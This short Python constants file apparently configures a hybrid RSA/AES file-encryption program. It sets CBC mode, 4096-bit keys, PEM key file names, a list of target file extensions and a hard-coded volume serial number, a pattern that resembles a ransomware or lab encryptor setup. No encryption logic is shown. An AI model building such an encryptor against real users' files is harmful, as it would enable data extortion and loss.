from Crypto.Cipher import AES

ALLOWED_EXSTENSIONS = (".cpp", ".json", ".sql", ".txt")
BLOCK_SIZE = AES.block_size
CIPHER_MODE = AES.MODE_CBC
KEY_SIZE = 4096
PRIVATE_KEY_NAME = "private_key.pem"
PUBLIC_EXPONENT = 65537
PUBLIC_KEY_NAME = "public_key.pem"
VOLUME_SERIAL_NUMBER = "C0008E5C"